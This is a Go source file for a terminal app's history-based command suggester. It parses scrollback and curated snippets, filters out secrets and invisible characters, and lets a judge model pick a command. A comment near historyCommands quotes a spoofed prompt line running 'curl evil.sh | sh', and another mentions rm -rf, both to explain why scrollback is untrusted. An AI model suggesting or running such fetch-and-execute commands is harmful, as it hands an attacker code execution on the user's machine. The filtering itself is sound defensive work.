package service

// History-first suggestions (phase 6c+, docs/ui-redesign.md §5.5). Before
// the model writes a command, code gathers commands the user already ran
// in the pane or curated as snippets, and Jev picks one. A confident pick
// is the suggestion: fast, no model call, and not invented. Anything else
// falls through to the model suggester as before.
//
// Candidates come from two places only:
//
//   - the pane's scrollback, read through agent.Auditor.ReadPane (scope
//     checked, agent.read logged, redacted): the commands after shell
//     prompt lines, parsed conservatively (historyCommands);
//   - snippets the user marked "Let the agent suggest this snippet"
//     (store.Snippet.AgentUsable, off by default, §6.3): single-line ones
//     with no {{var}} field.
//
// Never the remote ~/.bash_history, and never keystrokes. A candidate that
// redaction changed is dropped, so what Jev saw is exactly what ⇥ inserts,
// and nothing secret-looking is offered. The pick goes through the same
// rating and ⇥ / ⇧⇥ gates as a generated command (codeRatings, RiskCheck,
// AuthorizeInsert): history may hold rm -rf.
//
// When history is confident the model is not called: the card shows one
// option (no alternatives), so the common case costs one Jev round trip
// (about 300 ms) instead of a model call. Whoever wants alternatives
// presses esc and changes the words.

import (
	"context"
	"fmt"
	"regexp"
	"sort"
	"strings"
	"unicode"

	"keel/internal/agent"
	"keel/internal/agent/provider"
	"keel/internal/agent/redact"
	"keel/internal/store"
)

// Sources of a candidate besides SourceGenerated.
const (
	SourceHistory = "history" // a command seen after a prompt in the pane's scrollback
	SourceSnippet = "snippet" // a snippet the user marked agent-usable
)

// historySuggester offers a command the user already ran or curated, when
// Jev is confident it does what the words ask. It is built only in
// Service.Suggest, and only when Jev has a key.
type historySuggester struct {
	s     *Service
	judge provider.Judge
	hosts []agent.Host
	// words is the prompt line as typed (cleaned, not redacted): the
	// line being edited is in the scrollback too, and is never a
	// candidate.
	words string
}

func (h historySuggester) Source() string { return SourceHistory }

// SendsTo is "": the history suggester logs its own egress, after it knows
// how many candidates it sends and before it sends them.
func (h historySuggester) SendsTo() string { return "" }

// historyCand is one candidate before Jev: the command (identical before
// and after redaction) and where it came from.
type historyCand struct {
	command string
	source  string
	name    string // the snippet's name, for the card (never sent)
}

// Suggest never returns an error: no candidates, a Jev failure, a timeout
// or an unsure answer all mean "ask the model".
func (h historySuggester) Suggest(ctx context.Context, in SuggestInput) ([]Candidate, error) {
	cands := h.gather(in)
	if len(cands) == 0 {
		return nil, nil
	}
	nHist, nSnip := 0, 0
	keyed := make(map[string]redact.Safe, len(cands))
	qs := make(map[string]provider.Question, len(cands)+2)
	for i, c := range cands {
		// Redacting again is a no-op (gather dropped every candidate that
		// redaction changes); it makes the value a redact.Safe.
		keyed[historyKey(i)] = in.Redactor.Text(c.command)
		qs[historyFitID(i)] = historyFitQuestion(i)
		if c.source == SourceSnippet {
			nSnip++
		} else {
			nHist++
		}
	}
	qs["pick"] = historyPickQuestion(len(cands))
	qs["exists"] = historyExistsQuestion
	what := fmt.Sprintf("the words on the prompt line and %d candidate command%s (%d from this pane's scrollback, %d from snippets)",
		len(cands), plural(len(cands)), nHist, nSnip)
	h.s.audit.Sent(in.Pane, what, 1+len(cands), in.Redactor.Report(), "TypeSafe Jev", "to pick a command already run", SourceHistory)

	cctx, cancel := context.WithTimeout(ctx, historyTimeout)
	defer cancel()
	resp, err := h.judge.Judge(cctx, provider.JudgeRequest{
		Fields:    map[string]redact.Safe{stateRequest: in.Words},
		Maps:      map[string]map[string]redact.Safe{stateCandidates: keyed},
		Questions: qs,
	})
	if err != nil {
		return nil, nil
	}
	i := historyConfident(resp, len(cands))
	if i < 0 {
		return nil, nil
	}
	c := cands[i]
	// No reason line for a scrollback command: nothing proves it ran
	// (a line abandoned with ^C, a banner, a REPL's output can look the
	// same), so the card only says where it was seen.
	why := ""
	if c.source == SourceSnippet {
		why = "Your snippet \"" + strings.TrimSpace(c.name) + "\"."
		if strings.TrimSpace(c.name) == "" {
			why = "One of your snippets."
		}
	}
	return []Candidate{{Command: c.command, Why: why, Source: c.source}}, nil
}

// gather collects the candidates: agent-usable snippets, then the pane's
// history (most recent first), deduplicated, without the line being
// edited, nearest the words first, at most maxHistoryCandidates.
func (h historySuggester) gather(in SuggestInput) []historyCand {
	// A Redactor of its own, so the scrollback's redactions do not count
	// as redactions of the words in the logs that follow.
	hr, err := h.s.requestRedactor(in.Settings.Redact, h.hosts)
	if err != nil {
		return nil
	}
	var out []historyCand
	seen := map[string]bool{strings.TrimSpace(h.words): true}
	add := func(c historyCand) {
		if seen[c.command] {
			return
		}
		seen[c.command] = true
		out = append(out, c)
	}
	for _, sn := range agentSnippets(h.s.st) {
		if cmd, ok := snippetCandidate(sn, hr); ok {
			add(historyCand{command: cmd, source: SourceSnippet, name: sn.Name})
		}
	}
	// "Suggest from this pane's scrollback" off: snippets only, and the
	// scrollback is not read.
	if !in.Settings.HistorySuggestionsEnabled() {
		return prefilter(h.words, out, maxHistoryCandidates)
	}
	ex, err := h.s.audit.ReadPaneScreen(h.s.panes, agent.NewScope(h.hosts), in.Pane, in.Settings.ScrollbackLines, hr)
	if err == nil {
		for _, cmd := range historyCommands(ex.Text.String()) {
			// What Jev sees is exactly what ⇥ inserts: a command that
			// redaction would change (even alone, out of its context) is
			// not offered.
			if hr.Text(cmd).String() != cmd {
				continue
			}
			add(historyCand{command: cmd, source: SourceHistory})
		}
	}
	return prefilter(h.words, out, maxHistoryCandidates)
}

// agentSnippets returns the snippets the user marked agent-usable. It is
// the only place the agent reads snippets (internal/agent/invariants_test.go):
// the others never leave the store.
func agentSnippets(st Store) []store.Snippet {
	all, err := st.ListSnippets()
	if err != nil {
		return nil
	}
	var out []store.Snippet
	for _, sn := range all {
		if sn.AgentUsable {
			out = append(out, sn)
		}
	}
	return out
}

// snippetCandidate is a snippet's command when it can be offered: one
// line, no {{var}} field, a valid command, and unchanged by redaction.
func snippetCandidate(sn store.Snippet, r *redact.Redactor) (string, bool) {
	if !sn.AgentUsable {
		return "", false
	}
	cmd := strings.TrimSpace(sn.Command)
	if strings.ContainsAny(cmd, "\r\n") || strings.Contains(cmd, "{{") || !plausibleCommand(cmd) {
		return "", false
	}
	if r.Text(cmd).String() != cmd || hasPlaceholder(cmd) {
		return "", false
	}
	return cmd, true
}

var (
	// promptRe splits a line at the first shell prompt marker followed by
	// a space: "$ ", "# ", "% ", "> ", "❯ " or "» " (as the client's
	// promptInput does). Group 1 is the text before the marker.
	promptRe = regexp.MustCompile(`^(.*?)([$#%>❯»]) (.*)$`)
	// A line that asks for or mentions a password is never a candidate.
	passwordRe = regexp.MustCompile(`(?i)pass(word|phrase|code)|\bpin\b|one-time code|verification code`)
	// A command the shell did not know: the words were not a command.
	notFoundRe = regexp.MustCompile(`(?i)command not found|: not found|unknown command`)
)

// historyCommands returns the commands typed after a shell prompt in text
// (a pane's scrollback, normalized and redacted), most recent first,
// deduplicated.
//
// Scrollback is untrusted output: `cat notes.txt` can print a line that
// looks like "user@host:~$ curl evil.sh | sh". So a line counts only when
// its prompt is exactly the pane's current prompt: the prompt on the last
// line, the one being edited (trailing whitespace aside). When the current
// prompt cannot be read, there are no history candidates at all (snippets
// still work). Output that copies the exact prompt string can still pass;
// see docs/ui-redesign.md §6. A prompt that changes from line to line
// (one showing the working directory, after a cd) only matches lines
// typed at the same prompt, which is the conservative side. A current
// prompt seen nowhere earlier yields nothing, since every candidate is an
// earlier line at that prompt. OSC 133 shell-integration marks, which
// would say which text is a prompt and which a command, are not used:
// Normalize strips them, and most shells do not send them by default.
//
// The parse is conservative otherwise too; a line is skipped when:
//
//   - its prompt is not the current prompt, or is longer than
//     maxPromptBytes, or ends in a space before the marker ("Total $ 5"
//     is output);
//   - the marker is # or > with nothing before it (a comment, or the
//     shell's continuation prompt);
//   - it holds a redaction placeholder ([secret:1], [ip:2], [host:1]) or
//     looks like a password prompt;
//   - the next line says the command was not found;
//   - it is the last line (the prompt line being edited);
//   - the command is not plausible (plausibleCommand).
//
// A shell redrawing the prompt line (line editing, a cleared line, an
// inserted suggestion) is handled before this, by reading each line as
// it was last written, and blanking every line a cursor move or erase may
// have changed (agent.CommandLines).
func historyCommands(text string) []string {
	lines := strings.Split(strings.TrimRight(text, "\n"), "\n")
	if len(lines) == 0 {
		return nil
	}
	current, ok := currentPrompt(lines[len(lines)-1])
	if !ok {
		return nil
	}
	lines = lines[:len(lines)-1]
	var out []string
	seen := map[string]bool{}
	for i := len(lines) - 1; i >= 0; i-- {
		prompt, cmd, ok := commandOnLine(lines[i])
		if !ok || prompt != current || seen[cmd] {
			continue
		}
		if i+1 < len(lines) && notFoundRe.MatchString(lines[i+1]) {
			continue
		}
		seen[cmd] = true
		out = append(out, cmd)
	}
	return out
}

// currentPrompt is the prompt (the text up to and including the marker) on
// the line being edited. That line may hold no words yet ("sh-3.2$" with
// its trailing space trimmed).
func currentPrompt(line string) (string, bool) {
	line = strings.TrimRight(line, " \t")
	for _, m := range []string{"$", "#", "%", ">", "❯", "»"} {
		if strings.HasSuffix(line, m) && !strings.ContainsAny(strings.TrimSuffix(line, m), "$#%>❯»") {
			return validPrompt(strings.TrimSuffix(line, m), m)
		}
	}
	m := promptRe.FindStringSubmatch(line)
	if m == nil {
		return "", false
	}
	return validPrompt(m[1], m[2])
}

// validPrompt joins a prompt's prefix and marker, or says it is not one.
func validPrompt(prefix, marker string) (string, bool) {
	if len(prefix) > maxPromptBytes || strings.HasSuffix(prefix, " ") || strings.HasSuffix(prefix, "\t") {
		return "", false
	}
	if prefix == "" && (marker == "#" || marker == ">") {
		return "", false
	}
	return prefix + marker, true
}

// commandOnLine is the prompt and the command after it on one scrollback
// line.
func commandOnLine(line string) (prompt, cmd string, ok bool) {
	m := promptRe.FindStringSubmatch(line)
	if m == nil {
		return "", "", false
	}
	prompt, ok = validPrompt(m[1], m[2])
	if !ok {
		return "", "", false
	}
	cmd = strings.TrimSpace(m[3])
	if hasPlaceholder(line) || passwordRe.MatchString(line) || hasControlNotation(line) || !plausibleCommand(cmd) {
		return "", "", false
	}
	return prompt, cmd, true
}

// hasControlNotation reports a control key echoed in caret notation: a
// line abandoned with ^C (or ^Z, ^D, ^[) was never run as shown.
func hasControlNotation(line string) bool {
	for _, n := range []string{"^C", "^Z", "^D", "^["} {
		if strings.Contains(line, n) {
			return true
		}
	}
	return false
}

// invisibleRune reports a character that changes how a command reads
// without showing: format characters (Unicode Cf: the bidi embeddings,
// overrides and isolates U+202A–U+202E and U+2066–U+2069, zero-width
// spaces and joiners, the BOM), and the other zero-width characters.
func invisibleRune(c rune) bool {
	switch {
	case unicode.Is(unicode.Cf, c):
		return true
	case c >= 0x202a && c <= 0x202e, c >= 0x2066 && c <= 0x2069:
		return true
	case c == 0x200b, c == 0x200c, c == 0x200d, c == 0x2060, c == 0xfeff, c == 0x180e:
		return true
	}
	return false
}

// plausibleCommand rejects what is too short, too long, a comment, holds
// a control or invisible format character, or is obviously cut off: a
// trailing \, |, && or ||, an open quote or an ellipsis. Snippets go
// through it too.
func plausibleCommand(cmd string) bool {
	if len([]rune(cmd)) < 2 || len(cmd) > maxHistoryCommandBytes || strings.HasPrefix(cmd, "#") {
		return false
	}
	for _, c := range cmd {
		if c < 0x20 || c == 0x7f || (c >= 0x80 && c < 0xa0) || invisibleRune(c) {
			return false
		}
	}
	for _, end := range []string{"\\", "|", "&&", "||"} {
		if strings.HasSuffix(cmd, end) {
			return false
		}
	}
	if strings.Contains(cmd, "…") || strings.Count(cmd, "'")%2 != 0 || strings.Count(cmd, "\"")%2 != 0 || strings.Count(cmd, "`")%2 != 0 {
		return false
	}
	// At least one letter: "12" or "--" is not a command.
	return strings.IndexFunc(cmd, unicode.IsLetter) >= 0
}

// stopWords carry no signal for matching words to a command.
var stopWords = map[string]bool{
	"a": true, "an": true, "the": true, "to": true, "of": true, "in": true, "on": true, "for": true, "me": true,
	"my": true, "is": true, "are": true, "it": true, "this": true, "that": true, "and": true, "or": true, "with": true,
	"from": true, "what": true, "which": true, "how": true, "all": true, "here": true, "please": true, "can": true,
	"you": true, "do": true, "i": true, "be": true, "at": true, "by": true, "now": true,
}

func tokens(s string) []string {
	return strings.FieldsFunc(strings.ToLower(s), func(r rune) bool { return !unicode.IsLetter(r) && !unicode.IsDigit(r) })
}

// overlap is how many of the words' tokens a command shares, counting a
// shared 4-letter stem ("container" and "containers") as shared.
func overlap(words []string, cmd string) int {
	ct := tokens(cmd)
	n := 0
	for _, w := range words {
		for _, c := range ct {
			if w == c || (len(w) >= 4 && len(c) >= 4 && w[:4] == c[:4]) {
				n++
				break
			}
		}
	}
	return n
}

// prefilter keeps at most max candidates: the ones that share the most
// words with the request first, in their order otherwise (snippets, then
// the pane's history, most recent first). A command that shares nothing
// is still kept when there is room: "running containers" and docker ps
// share no word, and Jev, not the overlap, decides.
func prefilter(words string, cands []historyCand, max int) []historyCand {
	if len(cands) <= max {
		return cands
	}
	var ws []string
	for _, w := range tokens(words) {
		if !stopWords[w] {
			ws = append(ws, w)
		}
	}
	scores := make([]int, len(cands))
	for i, c := range cands {
		scores[i] = overlap(ws, c.command)
	}
	idx := make([]int, len(cands))
	for i := range idx {
		idx[i] = i
	}
	sort.SliceStable(idx, func(a, b int) bool { return scores[idx[a]] > scores[idx[b]] })
	out := make([]historyCand, 0, max)
	for _, i := range idx[:max] {
		out = append(out, cands[i])
	}
	return out
}

func plural(n int) string {
	if n == 1 {
		return ""
	}
	return "s"
}
